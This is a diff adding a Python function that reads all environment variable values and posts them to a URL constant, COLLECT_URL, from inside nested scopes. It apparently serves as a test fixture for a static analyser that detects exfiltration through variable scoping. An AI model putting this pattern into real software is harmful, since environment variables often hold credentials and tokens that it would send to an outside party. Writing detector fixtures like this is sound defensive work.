@@ -15,6 +15,19 @@ def collect():
     send()
 
 
+def collect_with_log():
+    # An attribute target of `with ... as` or `for` does not hide the client of the parent.
+    client = requests.Session()
+    payload = list(os.environ.values())
+
+    def send():
+        with open("send.log", "w") as client.log:
+            for client.attempt in range(3):
+                client.post(COLLECT_URL, json=payload)
+
+    send()
+
+
 def collect_twice_nested():
     # The local is two functions up.
     names = list(os.environ.items())
